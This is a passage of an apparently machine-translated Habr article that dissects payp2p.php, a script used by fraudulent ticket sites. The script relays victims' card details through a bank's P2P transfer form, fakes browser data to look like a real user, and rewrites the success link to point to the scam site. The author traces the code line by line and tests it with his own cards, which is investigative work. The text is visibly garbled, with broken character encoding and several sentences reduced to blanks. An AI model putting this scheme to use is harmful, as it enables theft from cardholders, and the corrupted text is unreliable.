<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 80 - O URL √© armazenado na vari√°vel $ login_url. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 81 - O URL √© armazenado na vari√°vel $ agent. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 82 - Inicializa a sess√£o cURL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 83-90 - Os par√¢metros s√£o definidos para a sess√£o com CURL (endere√ßo da p√°gina armazenado anteriormente em $ login_url; identificador do navegador armazenado anteriormente em $ agent; p√°gina da qual a p√°gina √© redirecionada ou referida de outra forma; REFERER; configura√ß√µes de COOKIES, etc.) </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 91 - Como resultado do comando curl_exec, uma p√°gina da Web ser√° obtida de forma program√°tica, que ser√° salva na vari√°vel $ page. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 93-95 A p√°gina da web salva $ page cont√©m ~ "n√∫mero do pedido" ORDER_NUM, que √© armazenado na vari√°vel $ ord.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 96-98 A p√°gina da p√°gina $ salva cont√©m o carimbo de data / hora TIMESTAMP, que √© armazenado na vari√°vel $ tim.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de informa√ß√µes de depura√ß√£o</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/416/148/8ba/4161488ba0f64c8d9575a7f973d3d841.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/6f6/35b/d05/6f635bd056d5466a956643acab2e3b30.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora, um "navegador de software" precisa ir para a p√°gina </font></font><code>https://3ds.payment.ru/P2P_ACTION/card_form.html</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Esta √© a mesma p√°gina de pagamento, cuja captura de tela foi mostrada acima. Esta √© uma p√°gina com um formul√°rio, parte dos campos de servi√ßo ocultos. Parte do c√≥digo HTML com campos de entrada ocultos foi mostrada acima. Alguns valores desses campos ocultos precisam ser lembrados para serem utilizados posteriormente ao enviar o formul√°rio. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 99 - Salvamos o endere√ßo da p√°gina na vari√°vel $ url. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 100 - Os par√¢metros para a sess√£o com URL s√£o definidos (neste caso, apenas o endere√ßo da p√°gina. O restante das configura√ß√µes permanece o mesmo). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 101-102 As vari√°veis ‚Äã‚Äãusadas anteriormente $ page e $ part s√£o exclu√≠das. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 103 - Como resultado do comando curl_exec, uma p√°gina da Web ser√° obtida programaticamente, que ser√° salva na vari√°vel $ page.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 104-106 A p√°gina da web $ page salva cont√©m o valor do campo TERMINAL, que √© armazenado na vari√°vel $ term. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 107-109 A p√°gina da web $ page salva cont√©m o valor do campo TRTYPE, que √© armazenado na vari√°vel $ type. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 110-112 A p√°gina da web $ page salva cont√©m o valor do campo MERCHANT, que √© armazenado na vari√°vel $ merch. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 113-115 A p√°gina da web $ page salva cont√©m o valor do campo EMAIL, que √© armazenado na vari√°vel $ ml. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em geral, esses valores na forma indicada nunca s√£o alterados. E eles podem ser salvos no c√≥digo como constantes e n√£o recebidos sempre. Obviamente, a obten√ß√£o dos valores desses campos √© feita para seguran√ßa adicional, caso um ou mais campos sejam alterados em algum momento no futuro.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Descri√ß√£o de alguns campos. </font><font style="vertical-align: inherit;">√â f√°cil encontrar uma descri√ß√£o completa de todos os campos no Google.</font></font><br>
<br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TERMINAL - N√∫mero √∫nico do terminal virtual da sa√≠da </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
MERCH_NAME - Nome do ponto de </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
venda MERCHANT - N√∫mero da sa√≠da atribu√≠da pelo banco </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
TRTYPE - Tipo de transa√ß√£o solicitada (Pagamento - 1, Cancelar - 22, Pr√©-autoriza√ß√£o - 0, Conclus√£o de liquida√ß√µes - 21) </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
EMAIL - Endere√ßo de e-mail para enviar alertas</font></font></blockquote><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de informa√ß√µes de depura√ß√£o</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/bf5/4a7/457/bf54a74574f44b1a8cb34bfa95eac091.png"><br>
    ,   -   . ($page)<br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
EMAIL aqui, este √© um caso √©pico. Quem se importa, materiais adicionais sobre este EMAIL no final do artigo no aplicativo sob o spoiler. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9d4/cf1/5c9/9d4cf15c98584bc8a4dc45b78051ad26.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqui vemos um grande bloco. O fato de parecer grande √© explicado pela largura limitada da coluna na publica√ß√£o e pela conveniente apresenta√ß√£o do c√≥digo pelo autor do script. Tudo o mesmo poderia ser colocado em 10 linhas de c√≥digo, mas a conveni√™ncia de ler e editar o c√≥digo seria prejudicada. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 120 - Na vari√°vel $ url, salve o endere√ßo da p√°gina. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 121-123 - Defina os par√¢metros para uma sess√£o com URL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 124 - uma matriz de $ ncrd √© criada a partir do n√∫mero do cart√£o do destinat√°rio na vari√°vel de cadeia $ crd, que conter√° partes do n√∫mero do cart√£o divididas em quatro. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 125 - cabe√ßalhos HTTP s√£o armazenados na vari√°vel de matriz $ headers.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 126 - Os par√¢metros s√£o definidos para a sess√£o com CURL (cabe√ßalhos HTTP da vari√°vel $ headers. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 135-164 - √â criada uma matriz $ postL, cujo valor corresponder√° ao campo do formul√°rio na p√°gina de pagamento (n√∫mero do cart√£o do remetente, dividido por quatro; data de validade do cart√£o do remetente) ; Cart√£o CVC do remetente; n√∫mero do cart√£o do destinat√°rio de quatro vias; data de validade do cart√£o do destinat√°rio; cart√£o CVC do destinat√°rio; valor do pagamento; "n√∫mero do pedido"; descri√ß√£o da p√°gina de confirma√ß√£o; n√∫mero do terminal; nome do ponto de venda; e-mail para notifica√ß√µes; carimbo de data / hora ; n√∫mero do cart√£o do remetente n√£o dividido em partes; n√∫mero do cart√£o do destinat√°rio n√£o dividido em partes; dados sobre software e hardware "no computador do remetente", projetados para criar a apar√™ncia de um usu√°rio real, n√£o de um script).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 135 - Os par√¢metros s√£o definidos para a sess√£o cURL (dados transmitidos na solicita√ß√£o HTTP POST. Nesse caso, a matriz $ postL √© convertida em uma string, que √© uma string codificada em url, como </font></font><code>'p1=val1&amp;p2=val2&amp;...'</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Os </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
dados transmitidos mais claramente s√£o mostrados na captura de tela com as informa√ß√µes de depura√ß√£o abaixo.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de informa√ß√µes de depura√ß√£o</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/9b0/140/642/9b0140642ef74fbf968fa4c299677a33.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/f9e/70e/ac8/f9e70eac88e74b088d3c37c1736eab09.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 166 - Como resultado do comando curl_exec, os dados preparados ser√£o enviados para o formul√°rio da p√°gina da web usando o m√©todo POST. Para uma p√°gina da Web, esse envio ser√° exatamente igual ao de um usu√°rio comum que preencheu e confirmou o formul√°rio em um navegador comum. A p√°gina com o resultado do envio de dados para o formul√°rio ser√° salva na vari√°vel $ page. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 167 - A sess√£o cURL termina. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 168 - Na p√°gina resultante, que √© armazenada na vari√°vel $ page, e, como lembramos, √© uma linha longa, a subcadeia ‚ÄúError‚Äù √© pesquisada.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linhas 169-173 - Se a substring "Error" for encontrada, por 5 segundos a mensagem de erro "O cart√£o n√£o se encaixa" √© exibida e, em seguida, o script sai e redireciona a p√°gina exibida no navegador para a "p√°gina de pedidos". Se o usu√°rio for persistente, ele poder√° tentar novamente o procedimento de pagamento. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
P√°gina exibida em caso de erro. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2f6/7b0/d80/2f67b0d80a7e49b88b9432eacd6d9085.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
As causas dos erros emitidos pelo banco podem ser diferentes (um erro no n√∫mero do cart√£o, fundos insuficientes, um erro de autoriza√ß√£o e muitos outros). Mas para o script payp2p.php n√£o h√° diferen√ßa. Depois que o pagamento falha, significa que o usu√°rio √© redirecionado para a p√°gina da qual voc√™ pode repetir a tentativa de pagamento. A p√°gina √† qual o erro √© retornado pode ser facilmente alterada, dependendo da tarefa.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de c√≥digo HTML retornado pela p√°gina do banco, em caso de erro</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span><font></font>
<font></font>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">base</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/netcetera/netcetera.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/riskminder-client.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
    </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">redirect</span></span></span></span><span class="javascript"><span class="hljs-function">(</span></span><span class="hljs-params"><span class="javascript"><span class="hljs-function"><span class="hljs-params">rctext, ext_diag_code</span></span></span></span><span class="javascript"><span class="hljs-function">)</span></span></span><span class="javascript">{
	</span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Call your bank"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/CallYourBank"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is restricted"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ForbiddenTransaction"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is disabled"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/BlockedCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Invalid amount"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in amount field"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Wrong original amount"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectAmount"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Re-enter transaction"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/Retry"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Expired card"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ExpiredCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Not sufficient funds"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/InsufficientBalance"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds amount limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/AmountOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds frequency limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/QuantityOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card number field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectNumber"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card expiration date field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectExpiresDate"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in currency field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectCurrency"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"AS_FAIL"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectPassword"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; (ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"NS_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"S_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"UNAVAIL"</span></span></span><span class="javascript">)){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/3DSFailure"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> {
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/TechReasons"</span></span></span><span class="javascript">;
	}
   }
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"netcetera_set_DID('');redirect('Authentication failed','BIN_ERROR')"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Um exemplo de informa√ß√µes de depura√ß√£o se o banco relatar um erro ao pagar</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/73f/c74/88a/73fc7488aa40469da8984c474be4ae1b.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 174 - Se n√£o houve sa√≠da anterior do script devido a um erro no pagamento, isso significa que tudo est√° indo conforme o esperado. </font><font style="vertical-align: inherit;">Na p√°gina salva anteriormente na vari√°vel $ page, todas as substrings com o endere√ßo s√£o substitu√≠das por uma </font></font><code>https://3ds.payment.ru/cgi-bin/cgi_link</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">string com um endere√ßo do tipo mydomain.ru/sus.php?cd = ... - esse √© o endere√ßo da p√°gina no site fraudulento ao qual o usu√°rio deve acessar se o pagamento for bem-sucedido. </font><font style="vertical-align: inherit;">(Nessa p√°gina, o usu√°rio pode ser agradecido e informado que os tickets eletr√¥nicos foram enviados por correio). </font><font style="vertical-align: inherit;">Ap√≥s substituir a substring, o resultado √© armazenado na vari√°vel $ pp.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Linha 175 - A vari√°vel $ pp √© exibida no navegador. Como a vari√°vel $ pp √© uma sequ√™ncia com o c√≥digo HTML completo da p√°gina, o usu√°rio ver√° alguma p√°gina. A p√°gina exibida n√£o ser√° diferente externamente da p√°gina original que o banco forneceu - a diferen√ßa estar√° apenas no c√≥digo HTML no local em que o link foi substitu√≠do. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ent√£o, o que √© essa p√°gina que o banco fornece no caso de inserir o n√∫mero correto do cart√£o e em que o script substitui um link para a p√°gina de pagamento bem-sucedida em um site fraudulento? E, afinal, provavelmente ainda deve haver um cheque 3D Secure dos bancos emissores, o que n√£o permitir√° o pagamento? O c√≥digo terminou no local mais interessante e h√° d√∫vidas de que, sem scripts, formul√°rios etc. adicionais complicados, ele pode funcionar.</font></font><br>
<br>
<b>     .          - .     .       .</b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Eu dirijo o n√∫mero do meu cart√£o banc√°rio no arquivo aviacfg.php. Vou tentar aceitar a transfer√™ncia, se, √© claro, funcionar. Eu abro a p√°gina do formul√°rio salva anteriormente no disco. Este formul√°rio foi simplesmente salvo no navegador ao visitar um dos sites fraudulentos, que no momento da reda√ß√£o da primeira parte da publica√ß√£o ainda funcionava. O formul√°rio j√° foi salvo com a soma de 2915 rublos, mas para testar √© demais. Vamos mudar isso. De qualquer forma, existem campos vis√≠veis e ocultos. Os campos ocultos (entrada, sele√ß√£o) n√£o s√£o diferentes dos campos comuns, exceto que eles n√£o s√£o vis√≠veis. Esses campos s√£o usados ‚Äã‚Äãpara armazenar informa√ß√µes de servi√ßo que o usu√°rio n√£o precisa ver. Os campos de entrada est√£o ocultos de duas maneiras.</font></font><br>
<br>
<ul>
<li>  CSS ( display:none).    ,     (input),    , ( DIV)     input.</li>
<li>     ‚Äî   ,  type=¬´hidden¬ª.      type=¬´text¬ª.</li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No nosso caso, os campos do formul√°rio est√£o ocultos usando type = "hidden". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pressionamos o navegador F12 (modo de desenvolvimento da web). Encontre o lugar certo no c√≥digo HTML e altere o texto type = "hidden" para type = "text" para dois ou mais elementos de entrada. Agora vemos os campos nos quais a soma e o c√≥digo de servi√ßo (c√≥digo) est√£o armazenados. Reduza a quantidade de 2915rub para 20rub. Agora, insira os dados do seu segundo cart√£o banc√°rio no formul√°rio. Dinheiro deve ser debitado deste cart√£o se for poss√≠vel fazer uma transfer√™ncia. </font></font><br>
<br>
<img src="https://habrastorage.org/files/ad2/9e5/fa2/ad29e5fa23e54550a59d9b54dd808ada.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Confirmamos o formul√°rio clicando no bot√£o "Pagar". Ap√≥s clicar no bot√£o, o script payp2p.php √© iniciado, que recebe os dados inseridos no formul√°rio.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para minha surpresa, depois de inserir o n√∫mero do cart√£o real e clicar no bot√£o "Pagar" no formul√°rio de teste, vi a p√°gina do Sberbank (o banco do qual a transfer√™ncia √© feita) na tela, pedindo para inserir o c√≥digo de confirma√ß√£o 3D Secure. </font></font><br>
<br>
<img src="https://habrastorage.org/files/587/7a4/aa3/5877a4aa3a514b3bb171c8ba1e264f07.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tamb√©m no meu telefone, recebi um SMS do Sberbank com um c√≥digo.</font></font><br>
<br>
<img src="https://habrastorage.org/files/c3b/628/abc/c3b628abc43a446bb15606dec3b9f083.jpg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
